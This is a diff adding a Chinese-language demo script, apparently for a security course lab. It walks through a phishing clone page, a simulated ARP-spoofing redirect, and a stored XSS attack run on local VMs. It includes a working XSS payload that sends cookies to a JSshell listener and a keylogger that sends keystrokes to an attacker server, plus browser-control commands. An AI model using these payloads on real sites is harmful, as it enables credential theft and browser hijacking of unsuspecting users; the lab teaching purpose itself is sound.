@@ -1,0 +1,121 @@
+=== 完整演示腳本 ===
+
+## 階段 1: 環境準備
+
+### Terminal 1 - 啟動真實伺服器 (VM2)
+```bash
+cd c:\Users\Alan\Desktop\coding\python\hacker_final\web_server
+python app.py
+```
+➜ 真實網站: http://127.0.0.1:5000
+
+### Terminal 2 - 啟動攻擊者伺服器 (VM1)
+```bash
+cd c:\Users\Alan\Desktop\coding\python\hacker_final\attacker_server
+python app.py
+```
+➜ 偽造網站: http://127.0.0.1:8888
+
+### Terminal 3 - 啟動 JSshell (VM1)
+```bash
+cd c:\Users\Alan\Desktop\coding\python\hacker_final\attacker_server\JSshell-master
+python jsh.py -g
+```
+➜ JSshell 監聽: port 4848
+
+## 階段 2: 頁面對比展示
+
+### 展示真實頁面
+1. 打開瀏覽器訪問: http://127.0.0.1:5000/login
+2. 指出頁面特徵:
+   - Logo: 🛡️ SecureWeb
+   - 標題: "使用者登入"
+   - 版本: v2.1.4 (2024-01-16)
+   - 只有登入選項
+
+### 展示偽造頁面
+1. 打開新分頁訪問: http://127.0.0.1:8888/login
+2. 對比差異:
+   - Logo: 🔒 SecureWeb
+   - 標題: "安全登入系統"
+   - 版本: v2.1.3 (2024-01-15)
+   - 額外的"關於我們"、"記住我"、"忘記密碼"
+
+## 階段 3: 模擬 ARP Spoofing 攻擊
+
+### 說明攻擊場景
+- VM1 (攻擊者) 執行 ARP Spoofing
+- VM3 (受害者) 以為在訪問真實網站
+- 實際被導向偽造網站
+
+### 演示受害者體驗
+1. 在偽造頁面輸入測試帳密: test/testpass
+2. 查看攻擊者控制面板: http://127.0.0.1:8888/admin
+3. 確認帳密被竊取
+4. 觀察偽造的成功頁面和自動跳轉
+
+## 階段 4: Stored XSS 攻擊
+
+### 使用竊取的帳密登入真實網站
+1. 訪問: http://127.0.0.1:5000/login
+2. 使用 test/testpass 登入
+
+### 注入 XSS + Keylogger + JSshell
+在留言板貼上:
+```html
+<script>
+// JSshell 反向連接
+setInterval(function(){
+    with(document)body.appendChild(createElement("script")).src="http://127.0.0.1:4848/?".concat(document.cookie)
+}, 1010);
+
+// Keylogger 指向攻擊者伺服器
+let keys='';
+document.addEventListener('keydown',e=>{
+    keys+=e.key;
+    if(keys.length>=8){
+        new Image().src='http://127.0.0.1:8888/keylogger?keys='+encodeURIComponent(keys);
+        keys='';
+    }
+});
+</script>
+```
+
+## 階段 5: 受害者模擬
+
+### 新用戶觸發攻擊
+1. 開無痕視窗
+2. 登入為 user/userpass
+3. 訪問留言板觸發 XSS
+4. 在頁面輸入文字測試 keylogger
+
+### 觀察攻擊效果
+1. JSshell terminal 收到連接
+2. 攻擊者控制面板顯示按鍵記錄
+3. 在 JSshell 中測試指令:
+   ```javascript
+   alert('瀏覽器已被控制!')
+   prompt('您的 Cookie:', document.cookie)
+   ```
+
+## 階段 6: 數據展示
+
+### 攻擊者收穫展示
+- 竊取的帳密文件
+- Keylogger 記錄
+- JSshell 控制權
+- CSRF 攻擊能力
+
+### 資料庫證據
+- 訪問: http://127.0.0.1:5000/admin/users (admin 身份)
+- 查看 XSS 載荷永久保存在資料庫
+
+## 演示重點
+
+✅ **視覺欺騙**: 99% 相似的頁面設計
+✅ **技術整合**: ARP + 釣魚 + XSS + Keylogger + JSshell
+✅ **持久化攻擊**: Stored XSS 永久保存
+✅ **完整攻擊鏈**: 從網路層到應用層
+✅ **實際危害**: 帳密竊取 + 瀏覽器控制 + 按鍵記錄
+
+這個演示完美展示了現代 Web 攻擊的複雜性和危險性！
